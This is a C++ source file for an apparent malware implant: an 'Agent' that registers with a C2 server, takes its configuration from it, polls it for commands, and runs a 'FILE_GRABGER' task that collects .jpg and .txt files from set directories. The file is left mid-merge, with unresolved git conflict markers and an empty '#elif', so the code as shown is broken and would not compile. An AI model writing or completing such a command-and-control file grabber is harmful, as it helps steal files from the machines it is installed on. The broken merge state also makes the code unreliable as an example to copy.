#include "Agent.h"

void Agent::start()
{
    #ifdef DEBUG
    std::string json_string = R"(
    {
        "FILE_GRABGER": 
        {
            "1337": 
            {
            "start_path": "/tmp/aa",
            "files": [".*.jpg", ".*\\.txt$"]
            },
            "1338": 
            {
                "start_path": "/tmp/gg",
<<<<<<< HEAD
                "files": [".*abcd"]
=======
                "files": ["abcd"]
>>>>>>> 0a525aac6cf25fc80044469ea9b1a7edfccaaf57
            }
        }
    }
    )";
    
    json config = json::parse(json_string);

<<<<<<< HEAD
=======
    Task * t = Task::BuildTask("FILE_GRABGER", config["FILE_GRABGER"]);

    tasks.push_back(std::unique_ptr<Task>(t));

>>>>>>> 0a525aac6cf25fc80044469ea9b1a7edfccaaf57
    #elif

    unsigned tries = 0;
    while (!agent_register())
    {
        tries += 1;
        if (tries >= 10)
        {
            throw std::runtime_error("Can't register to C2");
        }
        
        sleep(5);
    }
    
    config = get_server_config();

    #endif

    start_from_config(config);
<<<<<<< HEAD

    while (agent_run)
    {
        /* In reality we send http request to the c2, requesting new commands in this for loop */
        sleep(60 * 60);
    }
    
=======
>>>>>>> 0a525aac6cf25fc80044469ea9b1a7edfccaaf57
}


void Agent::stop()
{
    for (const std::unique_ptr<Task> & t : tasks)
    {
        t->stop();
    } 
}